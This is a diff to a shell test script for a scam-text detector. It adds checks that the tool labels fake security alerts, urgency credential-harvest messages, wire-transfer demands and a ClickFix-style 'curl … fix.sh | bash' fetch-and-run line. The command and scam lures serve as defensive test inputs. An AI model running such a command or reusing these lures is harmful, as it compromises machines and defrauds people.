@@ -2036,6 +2036,56 @@ assert d.get("canonical_brand") == "paypal", d
 ' && check "p33 json: login.paypal.com has canonical_brand=paypal" "0" "0" \
    || check "p33 json: login.paypal.com has canonical_brand=paypal" "0" "1"
 
+# ─── Perspective 34: unmapped signal family coverage ─────────────────────────
+# Fake security alert alone: shows specific pattern label
+./hlse_core text "virus detected on your device" 2>/dev/null \
+    | grep "Pattern:" \
+    | grep -qi "fake security alert\|account suspension" \
+    && check "p34: fake security alert shows specific pattern" "0" "0" \
+    || check "p34: fake security alert shows specific pattern" "0" "1"
+
+# Fake security alert + urgency: pattern promoted to urgency-credential-harvest
+./hlse_core text "Your account has been suspended! Verify immediately" 2>/dev/null \
+    | grep "Pattern:" \
+    | grep -qi "urgency credential\|credential-harvest" \
+    && check "p34: fake alert + urgency → urgency credential-harvest pattern" "0" "0" \
+    || check "p34: fake alert + urgency → urgency credential-harvest pattern" "0" "1"
+
+# Fake security alert: confidence now counts 2 signals (urgency + fake_alert)
+./hlse_core text "Your account has been suspended! Verify immediately" 2>/dev/null \
+    | grep "Confidence:" \
+    | grep -qi "2 independent\|corroborated" \
+    && check "p34: fake alert + urgency = 2-signal confidence" "0" "0" \
+    || check "p34: fake alert + urgency = 2-signal confidence" "0" "1"
+
+# Direct financial action: confidence counts it as a third independent signal
+./hlse_core text "Send money to this account urgently: wire transfer now to secure your funds" 2>/dev/null \
+    | grep "Confidence:" \
+    | grep -qi "3 independent\|high confidence" \
+    && check "p34: direct financial action raises confidence to 3 signals" "0" "0" \
+    || check "p34: direct financial action raises confidence to 3 signals" "0" "1"
+
+# Shell-pipe: now shows ClickFix/script-injection pattern (not blank)
+./hlse_core text "Run this fix: curl https://fixapp.com/fix.sh | bash" 2>/dev/null \
+    | grep "Pattern:" \
+    | grep -qi "ClickFix\|script-injection" \
+    && check "p34: shell-pipe shows script-injection pattern" "0" "0" \
+    || check "p34: shell-pipe shows script-injection pattern" "0" "1"
+
+# Shell-pipe: shows specific script-injection exoneration (not generic urgency text)
+./hlse_core text "Run this fix: curl https://fixapp.com/fix.sh | bash" 2>/dev/null \
+    | grep "Could be benign:" \
+    | grep -qi "package manager\|official.*website\|unexpected\|script-injection" \
+    && check "p34: shell-pipe shows script-injection exoneration" "0" "0" \
+    || check "p34: shell-pipe shows script-injection exoneration" "0" "1"
+
+# Fake security alert standalone: shows specific exoneration (not generic urgency)
+./hlse_core text "virus detected on your device" 2>/dev/null \
+    | grep "Could be benign:" \
+    | grep -qi "log in\|service directly\|bookmark\|security notice" \
+    && check "p34: fake security alert shows account-suspension exoneration" "0" "0" \
+    || check "p34: fake security alert shows account-suspension exoneration" "0" "1"
+
 # ─── Perspective 29: text attacker objective ──────────────────────────────────
 # BEC text: shows ◉ Attacker's goal with wire-transfer framing
 ./hlse_core text "CEO urgent: wire transfer 50000 immediately, do not discuss with anyone" 2>/dev/null \
@@ -2086,7 +2136,7 @@ assert "objective" not in d, d
 # Urgency ALERT: pattern-specific exoneration (not generic "urgent wording")
 ./hlse_core text "Your account has been suspended! Verify immediately - urgent action required" 2>/dev/null \
     | grep "Could be benign:" \
-    | grep -qi "separately-known\|time-sensitive\|channel" \
+    | grep -qi "decisive test\|navigate\|dashboard\|time-sensitive" \
     && check "p30: urgency ALERT shows pattern-specific exoneration" "0" "0" \
     || check "p30: urgency ALERT shows pattern-specific exoneration" "0" "1"
 
